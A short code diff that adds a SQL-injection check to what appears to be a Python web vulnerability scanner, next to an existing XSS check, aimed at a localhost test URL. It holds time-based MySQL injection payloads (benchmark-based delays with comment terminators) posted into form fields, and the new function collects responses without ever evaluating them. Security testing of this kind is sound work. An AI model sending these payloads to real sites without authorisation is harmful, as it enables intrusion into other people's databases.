@@ -153,6 +153,17 @@ def scan_xss(url):
     return is_vulnerable
 
 
+def scan_sql_injection(url):
+    ''' scans website for sql injection vulnerability '''
+    payloads = ['and 0=benchmark(3000000,MD5(1))%20/*', 'and 0=benchmark(3000000,MD5(1))%20--', 'and 0=benchmark(3000000,MD5(1))%20%23']
+    responceList = []
+
+    for loads in payloads:
+        data = {'userEmail':"usman@cyberpersons.com",'status':'1','password':"cyberpersons'",'findUs':loads}
+        result = requests.post(url, data)
+        responceList.append(result.text)
+
+
 if __name__ == "__main__":
     url = "http://127.0.0.1:65412/"
 
